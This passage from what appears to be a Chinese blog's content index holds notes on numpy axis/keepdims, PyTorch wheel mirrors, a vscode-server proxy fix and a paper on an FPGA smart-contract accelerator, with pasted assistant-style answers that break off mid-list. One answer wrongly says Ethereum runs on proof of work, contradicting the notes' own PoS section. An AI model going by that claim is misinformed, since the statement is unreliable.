data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(778,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(6695.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(8922.6,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(828,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1106,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(12141.8,0)\"><path data-c=\"23A4\" d=\"M0 1070V1154H347V-645H263V1070H0Z\" transform=\"translate(0,2136.8)\"/><path data-c=\"23A6\" d=\"M263 -560V1155H347V-644H0V-560H263Z\" transform=\"translate(0,-2146.8)\"/><svg width=\"667\" height=\"2683.5\" y=\"-1091.8\" x=\"0\" viewbox=\"0 670.9 667 2683.5\"><path data-c=\"23A5\" d=\"M263 0V602H347V0H263Z\" transform=\"scale(1,6.687)\"/></svg></g></g><g data-mml-node=\"mo\" transform=\"translate(28207.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(29263.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1136.2,413) scale(0.707)\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(31224.9,0)\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(32169.7,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"211D\" d=\"M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z\"/></g></g><g data-mml-node=\"TeXAtom\" transform=\"translate(755,413) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1051,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1829,0)\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g></g></g></g></g></svg></mjx-container></span></p>\n<h2 id=\"np中axiskeepdims的简单理解\">2 np中axis、keepdims的简单理解</h2>\n<p>一个矩阵shape = (n, m)</p>\n<p>keepdims = True 时，对他的axis=0进行计算，就是把 shape[0] 变成 1，(1,\nm)；对axis=1进行计算，就是把 shape[1] 变成 1，(n, 1)</p>\n<p>keepdims = False时，直接变成一维向量，结果分别为(m,) 和 (n,)</p>\n<p>对 a.shape=(2, 3)：</p>\n<table>\n<colgroup>\n<col style=\"width: 48%\">\n<col style=\"width: 33%\">\n<col style=\"width: 18%\">\n</colgroup>\n<thead>\n<tr>\n<th><strong>操作</strong></th>\n<th><strong>含义</strong></th>\n<th><strong>输出形状</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>np.sum(a, axis=0)</td>\n<td>每列相加</td>\n<td>(3,)</td>\n</tr>\n<tr>\n<td>np.sum(a, axis=1)</td>\n<td>每行相加</td>\n<td>(2,)</td>\n</tr>\n<tr>\n<td>np.sum(a, axis=0, keepdims=True)</td>\n<td>每列相加并保留“行”维度</td>\n<td>(1, 3)</td>\n</tr>\n<tr>\n<td>np.sum(a, axis=1, keepdims=True)</td>\n<td>每行相加并保留“列”维度</td>\n<td>(2, 1)</td>\n</tr>\n</tbody>\n</table>\n","categories":["笔记"],"tags":["AI","cs231n","数学"]},{"title":"python torch cuda","url":"/other/python-torch-cuda/","content":"<p>https://download.pytorch.org/whl/cu124/torch/\nhttps://download.pytorch.org/whl/cu124/torchvision/</p>\n<p>https://mirror.sjtu.edu.cn/pytorch-wheels/cu124/?mirror_intel_list</p>\n<span id=\"more\"></span>\n","categories":["备忘"],"tags":["python"]},{"title":"vscode-server下载慢","url":"/other/vscode-server/","content":"<p>vscode-server下载特别慢，每次连接服务器都要等很久，配置了\n<code>~/.bashrc</code> 全局代理也没用。</p>\n<p><strong>原因：</strong></p>\n<p>VSCode Remote SSH 使用的是 <strong>login shell</strong>，所以只会加载\n~/.bash_profile，<strong>不会自动加载 ~/.bashrc</strong>。</p>\n<p>如果你只写在 ~/.bashrc，VSCode 就看不到设置的代理变量了。</p>\n<p><strong>解决方案：</strong></p>\n<p>需要在 <code>~/.bash_profile</code> 中配置代理：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">'export http_proxy=http://192.168.3.129:21882'</span> &gt;&gt; ~/.bash_profile</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">'export https_proxy=http://192.168.3.129:21882'</span> &gt;&gt; ~/.bash_profile</span><br></pre></td></tr></table></figure>\n<p>或者直接加入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [ -f ~/.bashrc ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">source</span> ~/.bashrc</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n","categories":["备忘"],"tags":["vscode","cursor"]},{"title":"A Hardware Accelerator for Smart Contract Execution 论文笔记","url":"/blockchain/paper-SCU/","content":"<p>这个论文提出了一个新的硬件架构，可以显著提升智能合约的运行效率。</p>\n<p>因为EVM的栈式指令架构限制，目前以太坊智能合约执行效率非常低：</p>\n<ul>\n<li>每次运算的结果必须先存入栈中，才能被下一条指令调用。这导致了无法实现指令级并行。</li>\n<li>只能调用栈顶的数据，如果有需要使用的数据不在栈顶，必须先执行\n<code>DUP</code> ，拷贝数据到栈顶。这非常浪费性能。</li>\n</ul>\n<p>该论文提出了一个基于FPGA的硬件加速器，引入了RISC指令集取代传统的EVM指令集，从而实现指令集并行、事务级并行等优化。</p>\n<p>这篇博客开始是我随手记得笔记，文末有清晰的整理。</p>\n<span id=\"more\"></span>\n<h1 id=\"指令集并行\">指令集并行</h1>\n<p>指令集并行是最底层的一级并行。</p>\n<p>使用基于寄存器的RISC指令集。</p>\n<p>整体架构我认为和CPU差不多？里面很多概念都是系统结构课上提过的，保留站，ROB，顺序提交……</p>\n<p>总之，通过修改指令集，使得能够流水线并行执行指令，提升性能。</p>\n<p>一个SCU内部的数据流如下图：</p>\n<figure>\n<img src=\"/blockchain/paper-SCU/image-20240825220348346.png\" alt=\"image-20240825220348346\">\n<figcaption aria-hidden=\"true\">image-20240825220348346</figcaption>\n</figure>\n<h1 id=\"事务级并行\">事务级并行</h1>\n<p>区块链被调用执行的智能合约代码都是一个个事务。</p>\n<p>在以太坊设计中，事务必须按照它们在区块中出现的顺序执行。这是因为如果事务的执行顺序错误，可能会破坏事务之间的潜在<strong>数据依赖性</strong>。</p>\n<p>例如，一个事务可能会修改他所在合约中的状态变量，而下一个事务需要使用这个状态变量进行一些判断。</p>\n<p>为了解决这个问题，本文提出了两种方法：两步验证和异构多核设计。</p>\n<h2 id=\"事务执行过程\">*事务执行过程</h2>\n<p>在理解事务级并行的设计之前，先复习区块链中一个事务完整的执行过程。</p>\n<h3 id=\"以太坊1.0pow\">以太坊1.0（PoW）</h3>\n<p>以太坊1.0\n使用工作量证明（PoW）机制下的<strong>矿工节点</strong>执行事务。</p>\n<p>简要流程如下：</p>\n<ol type=\"1\">\n<li>事务创建：以太坊用户通过钱包发起一个事务。</li>\n<li>事务广播：钱包将事务发送到最近的区块链节点，随后逐渐广播到整个网络中。</li>\n<li>事务接收：节点接受到事务，经过简单验证后，将其加入自己的“事务池”中。</li>\n<li>区块构建：矿工节点选取一部分事务，进行挖矿。</li>\n<li>区块传播：将区块广播到全网络。其他节点会验证区块中的每个事务。</li>\n<li>更新区块链状态：通过验证后，更新区块链的状态，将这个区块添加到区块链的末尾。</li>\n<li>区块确认：在后续区块被挖出并接入区块链后，这个区块逐渐被确认。</li>\n</ol>\n<p>针对第4步，可能会有多个矿工选取了不同的事务同时进行挖矿，同时构建好了一个区块并传播。这时候会形成<strong>区块分叉</strong>，但是之后会通过共识机制只保留下来最长的链。</p>\n<p>详细内容见文末附录<a href=\"#以太坊1.0%20事务执行过程\">以太坊1.0\n事务执行过程</a>。</p>\n<h3 id=\"以太坊2.0pos\">以太坊2.0（PoS）</h3>\n<p>大体流程与1.0类似，区别在于：</p>\n<ol type=\"1\">\n<li>验证者节点选取：不再是各个矿工节点进行竞争，而是根据质押的金额，选取验证者节点。质押的以太币越多被选中的可能性越高。</li>\n<li>区块确认：拜占庭容错机制，投票确认区块。</li>\n</ol>\n<p>详细内容见文末附录<a href=\"#以太坊2.0%20事务执行过程\">以太坊2.0\n事务执行过程</a></p>\n<h2 id=\"两步验证\">两步验证</h2>\n<h2 id=\"设计概述\">设计概述</h2>\n<p>这部分写得很清晰，直接贴图和翻译：</p>\n<figure>\n<img src=\"/blockchain/paper-SCU/image-20240825220844127.png\" alt=\"image-20240825220844127\">\n<figcaption aria-hidden=\"true\">image-20240825220844127</figcaption>\n</figure>\n<p>图 3 展示了 SCU\n的设计概述和交易级并行性（TLP）的数据流。在接收到一个新块时，交易调度器将扫描交易并安排它们的执行顺序，如箭头\n1 所示。然后，调度器会将智能合约的代码加载到共享缓存中（流程\n2）。共享缓存采用内容感知的方法设计，以提高命中率。由于 SCU\n引擎作为验证器工作，矿工可以将热点智能合约广播给所有验证者。我们优先考虑将热点智能合约的代码保留在缓存中，而不是使用传统的最近最少使用（LRU）算法。</p>\n<p>接下来，调度器将验证任务分配给可用的 SCU 核心（流程\n3）。这些核心配备有一个本地缓冲区和 SCU 引擎，这些在 III-A2\n中进行了介绍。输入缓冲区和执行引擎的详细架构如图 2\n所示。在这个例子中，我们展示了两个核心的设置，这两个核心可以是<strong>大核心或小核心</strong>（下一节介绍）。因此，调度器将目标智能合约的代码部分加载到共享缓存中，并分别将交易转发给这两个引擎。SCU\n引擎在接收到交易后，会将输入和存储部分加载到其本地缓冲区中，从共享内存中提取代码，并开始执行。当任务完成后，输出集将被写入状态验证器以进行正确性检查（流程\n4）。</p>\n<p>在上述流程进行的同时，状态验证器将使用交易调度器的调度映射（通过流程\n5）并访问全局数据库（右侧的流程\n6）以执行状态验证。当验证器完成其工作后，如流程 6\n左侧箭头所示，全局数据库将被更新，从而最终处理当前块。</p>\n<p>TLP 是通过交易调度器、状态验证器和多个 SCU\n引擎实现的。如前所述，交易之间的依赖关系被检测到，并按照图 3\n中的格式生成一个调度映射。Tx 列显示交易的索引。SC\n列列出了获取智能合约代码的地址。然后，IS chk 和 OS chk\n列分别指示哪些输出集（OS）或输入集（IS）应在状态验证中进行检查。</p>\n<p>在这个例子中，我们可以看到，Tx1 没有前置交易，因此 IS1\n必须与数据库（DB）进行检查。Tx3 依赖于 Tx1 的结果，因此 IS3 必须与 OS1\n进行检查。换句话说，IS3 和 OS3\n应该匹配，这种正确性检查由状态验证器完成。与此同时，由于 Addr1 和 Addr2\n不同，Tx1 和 Tx2 之间没有依赖关系。因此，Tx1 和 Tx2 可以分别分配给\nEngine0 和 Engine1 并行执行。这些引擎将使用接收到的 IS1 和 IS2\n开始执行验证，而无需等待 IS1 和数据库之间的状态验证完成。</p>\n<h2 id=\"异构多核架构\">异构多核架构</h2>\n<p>之前一直疑惑什么是<strong>异构</strong>。即“大核心”和“小核心”。大核心配备了动态执行引擎，专注于提供最佳性能，但需要更多的硬件资源。小核心则配备了顺序执行的流水线引擎，消耗较少的硬件资源，但效率更高。利用这两种核心，我们的加速器可以配置为同质设计，即使用相同类型的多个核心，或者异构设计，即混合使用不同类型的核心。</p>\n<p>对于多核设计，挑战在于如何将交易调度到不同的核心。</p>\n<p>这一节讲解了本文提出的调度算法。很清晰，不重复写了。</p>\n<h1 id=\"问题\">问题</h1>\n<blockquote>\n<p>现在已经部署在以太坊上的智能合约无法被撤销，他们的代码已经被编译成EVM指令集的字节码。这个SCU应该是<strong>不能</strong>无缝使用之前的字节码的，必须重新编译成新的字节码，而且也必须在特定的FPGA上才能运行？还是也在EVM上运行？</p>\n</blockquote>\n<p>你提出的问题非常重要，涉及到新架构（如\nSCU）在现有以太坊生态系统中的适用性和兼容性。让我详细解答你的疑问。</p>\n<h3 id=\"scu-与现有-evm-字节码的兼容性\">1. <strong>SCU 与现有 EVM\n字节码的兼容性</strong></h3>\n<p>正如你所指出的，现有的智能合约已经部署在以太坊上，并且它们的代码已经被编译成\nEVM 指令集的字节码。这些字节码在传统的以太坊虚拟机（EVM）上运行，而 SCU\n提出的架构使用了一种新的 RISC 风格的\nISA，旨在通过提高指令级并行性和乱序执行来提升性能。</p>\n<p>由于 SCU 使用了不同的指令集架构（ISA），现有的 EVM 字节码不能直接在\nSCU 上运行。要在 SCU 上执行这些智能合约，必须将原有的 EVM\n字节码重新编译成适用于 SCU 的新的字节码。这意味着：</p>\n<ul>\n<li><strong>必须重新编译</strong>：现有的智能合约需要重新编译成适用于\nSCU 架构的字节码，这样才能利用 SCU 的高性能特性。</li>\n<li><strong>SCU 与 EVM 字节码不兼容</strong>：SCU\n不能无缝地使用之前已经编译成 EVM 字节码的智能合约代码。</li>\n</ul>\n<h3 id=\"scu-的运行环境\">2. <strong>SCU 的运行环境</strong></h3>\n<p>SCU 架构的设计和实现是基于 FPGA\n的，这意味着它在硬件层面是特定的，当前的实现目标是在 FPGA\n平台上运行。虽然理论上 SCU 架构可以在其他硬件上实现（例如通过 ASIC 或\nGPU），但当前设计是专门为 FPGA 优化的，且性能提升依赖于 FPGA\n的并行处理能力和硬件特性。</p>\n<ul>\n<li><strong>SCU 运行在 FPGA 上</strong>：SCU 的实现是针对 FPGA\n平台进行的优化，因此它必须在特定的 FPGA 上运行。</li>\n<li><strong>不能直接在 EVM 上运行</strong>：由于 SCU\n使用的是不同的指令集和执行引擎，它无法直接在传统的 EVM 上运行。</li>\n</ul>\n<h3 id=\"对以太坊现有生态系统的影响\">3.\n<strong>对以太坊现有生态系统的影响</strong></h3>\n<p>引入 SCU\n意味着为了利用新架构带来的性能提升，开发者需要使用新的编译工具链，将智能合约编译成\nSCU 支持的字节码格式。这将涉及到一系列兼容性和迁移的问题：</p>\n<ul>\n<li><strong>现有智能合约的迁移</strong>：如果开发者希望利用 SCU\n的性能优势，他们需要将现有的智能合约重新编译并部署在支持 SCU\n的网络节点上。</li>\n<li><strong>新智能合约的编译</strong>：未来开发的智能合约可以直接针对\nSCU 编译，以便在 SCU 上获得更高的执行效率。</li>\n</ul>\n<h3 id=\"总结\">4. <strong>总结</strong></h3>\n<p>SCU 提供了一个高性能的智能合约执行架构，但它与现有的 EVM\n字节码不兼容，需要将现有的智能合约重新编译成新的字节码格式。此外，SCU\n目前依赖于 FPGA 硬件，因此只能在特定的 FPGA\n平台上运行，而不能直接在传统的 EVM 上运行。</p>\n<p>这种设计带来了显著的性能提升，但也意味着在现有的以太坊生态系统中引入\nSCU 需要进行一些适应性调整和迁移工作。</p>\n<blockquote>\n<p>那现在怎么让FPGA接入以太坊呢？以太坊中其他主机又不是FPGA的，接进去怎么进行验证等计算？</p>\n</blockquote>\n<p>让 FPGA 接入以太坊网络，并与其他非 FPGA 节点（如传统的 CPU\n节点）协同工作，涉及到多方面的技术和架构设计。下面我将逐步解释这一过程。</p>\n<h3 id=\"fpga-节点的角色\">1. <strong>FPGA 节点的角色</strong></h3>\n<p>FPGA\n在以太坊网络中可以作为一个专用的验证节点或矿工节点运行，其主要职责是加速智能合约的执行和验证。FPGA\n节点可以处理复杂的智能合约计算任务，并将其结果与其他传统节点共享。</p>\n<h3 id=\"与现有网络的集成\">2. <strong>与现有网络的集成</strong></h3>\n<p>为了让 FPGA 接入以太坊网络，以下几点需要考虑：</p>\n<h4 id=\"a.-兼容性层\">a. <strong>兼容性层</strong></h4>\n<p>FPGA 节点需要一个兼容性层来处理以太坊网络中的通信协议（如\nDevP2P）。这个层可以在软件上实现，负责接收以太坊网络中的交易数据、块数据以及与其他节点的消息交换。这个层将确保\nFPGA 节点可以与以太坊网络的其他 CPU 节点无缝地进行通信。</p>\n<h4 id=\"b.-智能合约字节码的转换\">b.\n<strong>智能合约字节码的转换</strong></h4>\n<p>如前所述，SCU 架构使用不同的指令集。因此，现有的 EVM 字节码在发送给\nFPGA 节点之前需要进行转换。这可以通过以下两种方式实现： -\n<strong>在提交智能合约时进行转换</strong>：在开发者提交智能合约时，使用专门的编译器将智能合约编译成适用于\nFPGA 的字节码。这个字节码然后可以直接由 FPGA 节点执行。 -\n<strong>实时转换</strong>：在接收到交易时，FPGA\n节点的兼容性层可以实时地将 EVM 字节码转换为 SCU 指令集，然后再在 FPGA\n上执行。这需要额外的计算资源，但可以更好地支持现有的以太坊智能合约。</p>\n<h4 id=\"c.-验证和共识\">c. <strong>验证和共识</strong></h4>\n<p>FPGA\n节点执行智能合约后，生成的状态更新（即输出集）需要与网络中的其他节点进行验证和共识。由于以太坊网络采用的是\nPoW（工作量证明）共识机制，验证节点（包括 FPGA\n节点和传统节点）会对交易结果进行独立验证。</p>\n<ul>\n<li><strong>结果广播</strong>：FPGA\n节点将其计算结果（状态更新和执行证明）广播给网络中的其他节点。</li>\n<li><strong>结果验证</strong>：其他非 FPGA 节点可以使用传统的 EVM\n重新计算并验证 FPGA\n节点的结果。如果验证通过，网络就可以达成共识，将结果写入区块链。</li>\n</ul>\n<h3 id=\"混合节点架构\">3. <strong>混合节点架构</strong></h3>\n<p>FPGA 节点可以作为一种混合架构的一部分来运行：</p>\n<ul>\n<li><strong>专用加速器节点</strong>：FPGA\n节点可以作为一种专用加速器，处理计算密集型的智能合约交易。其他节点可以继续使用传统的\nEVM 来处理常规交易。</li>\n<li><strong>协同工作</strong>：以太坊客户端可以被设计为在常规交易负载较轻时将复杂的任务分配给\nFPGA 节点，而在负载较重时则利用 FPGA 的加速功能。</li>\n</ul>\n<h3 id=\"系统更新和适应\">4. <strong>系统更新和适应</strong></h3>\n<p>要将 FPGA 节点无缝集成到以太坊网络中，可能需要对以太坊客户端软件（如\nGeth 或 Parity）的代码进行扩展，以支持与 FPGA 节点的交互。这可能包括： 